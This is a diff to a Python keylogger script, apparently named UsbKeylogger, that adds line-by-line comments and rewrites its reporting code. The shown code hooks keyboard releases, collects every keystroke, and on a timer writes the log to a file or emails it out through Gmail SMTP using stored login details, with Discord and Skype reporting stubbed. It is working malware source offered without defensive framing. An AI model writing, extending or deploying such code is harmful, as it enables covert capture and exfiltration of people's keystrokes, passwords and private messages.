@@ -3,8 +3,8 @@ import keyboard # Imported to provide the ability to log keys
 import smtplib # Imported to provide the ability to send the recorded key logs though SMTP protocol for email
 
 from threading import Timer # Intended to make it possible to send reports have a set period of time
-from datetime import datetime
-from email import message
+from datetime import datetime # Imported to retrieve the current date times at certain periods of time
+from email import message # Imported to format emails for sending keylohs
 
 
 # Email Variables for report type of emails
@@ -28,22 +28,20 @@ class UsbKeylogger:
         self.fileIndentifier = f"Log = {startTime} to {endTime}" # Sets the file name to "Log start time to end time"
 
     def reportFile(self):
-        #fileIdentifierStr = "{self.fileIndentifier}.txt" # Creates a string variable from the file identifier variable
         with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
             print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file
 
     def reportEmail(self, address, password, contents, subject):
         email = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
-        msg = message.Message()
-        msg.add_header('from', address)
-        msg.add_header('to', address)
-        msg.add_header('subject', subject)
-        msg.set_payload(contents)
-
-        email.starttls()
-        email.login(address, password)
-        email.send_message(msg, from_addr = address, to_addrs = [address])
-        email.quit()
+        content = message.Message() # Creates a new message named content
+        content.add_header('subject', subject)  # Sets the to header to the provided subject, which the time interval of the keylogger
+        content.add_header('to', address) # Sets the to header to the provided address
+        content.add_header('from', address)  # Sets the from header to the provided address
+        content.set_payload(contents) # Sets the body of the email to the contents, which is  self.keylog
+        email.starttls() # Starts TLS for security
+        email.login(address, password) # Logs into the email with provided address and password
+        email.send_message(content, from_addr = address, to_addrs = [address]) # Sends the email 
+        email.quit() # Terminates the email server
 
     #def reportDiscord(self):
     #def reportSkype(self):
@@ -72,7 +70,6 @@ class UsbKeylogger:
             if self.reportType == "File":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
             elif self.reportType == "Email":
-                #mail = 'Subject: {}\n\n{}'.format(subjectText, self.keylog)
                 self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail funciton to sends an email of keylog recording
            
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
@@ -83,12 +80,15 @@ class UsbKeylogger:
         logTimer.start() # Starts the timer thread
 
     def start(self):
-        self.startTimeVal = datetime.now()
-        keyboard.on_release(callback = self.callbackKeyboard)
-        self.reportKeyLog()
-        keyboard.wait()
+        self.startTimeVal = datetime.now() # Gets current date time
+        keyboard.on_release(callback = self.callbackKeyboard) # Initializes the keylogger on
+        self.reportKeyLog() # Calls the function that records the keylogs within the time interval
+        keyboard.wait() 
 
 if __name__ == "__main__":
+        """
+        Uncomment the report type desired and comment the others
+        """
         usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
